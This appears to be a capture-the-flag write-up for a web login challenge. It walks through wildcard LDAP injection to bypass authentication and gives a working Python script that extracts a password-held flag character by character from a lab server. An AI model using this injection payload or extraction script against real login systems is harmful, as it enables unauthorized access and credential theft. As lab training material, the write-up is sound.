![[Pasted image 20230714155329.png]]
First we check source-code and there's no easy wins there. 

A small snippet of unsanitized inline JavaScript:
```JavaScript
 const queryString = window.location.search;
if (queryString) {
  const urlParams = new URLSearchParams(queryString);
  const message = urlParams.get('message');
  if (message) {
    document.getElementById("message").innerHTML = message;
    document.getElementById("message").style.visibility = "visible";
    }
  }
```
Allows us to do some XSS to alter the message we get upon faulty login, but not anything beneficial.

The text on the frontpage that "You can login using workstation password and username" could be a reference to some hidden usernames somewhere to be bruteforced. It could also be a sign of using LDAP.

We start up gobuster and start enumerating directories, as well as start hydra up to bruteforce against the username "Reese" and we start SQLmap.

But, simply using * and * in the two fields actually get us in. So likely we executed an LDAP injection. 

We now see:
![[Pasted image 20230714161238.png]]
Lets check for further LDAP-injection, first by using asterix. No results. But using a letter before our asterix, we seem to find all the names in the phonebook:
![[Pasted image 20230714161457.png]]
There's nothing really popping out except for Reese. At this point we can pretty safely assume that perhaps the password of Reese's account is our flag. And luckily, we can check using regex.

We type in Reese as username, and then we do ``HTB{*"`` as password. And yes, that logs us in. So all theres really left to do now is to write a script that checks every character:

```python
import requests
import string

# List of characters
characters = string.printable.replace("*", '')
url = "http://206.189.120.31:32331/login"
password = "HTB{"

while True:
	for character in characters:
		print("Guessing " + ''.join(password) + character + "*")
		r = requests.post(url, {"username":"Reese", "password": ''.join(password) + character + "*"})

		if r.headers['Content-Length'] == '2586':
			print("FOUND CHAR!")
			password = password + character
			break

	if password[-1] == '}':
		print("FOUND!!!!:" + password)
		exit()
```
And we got our flag.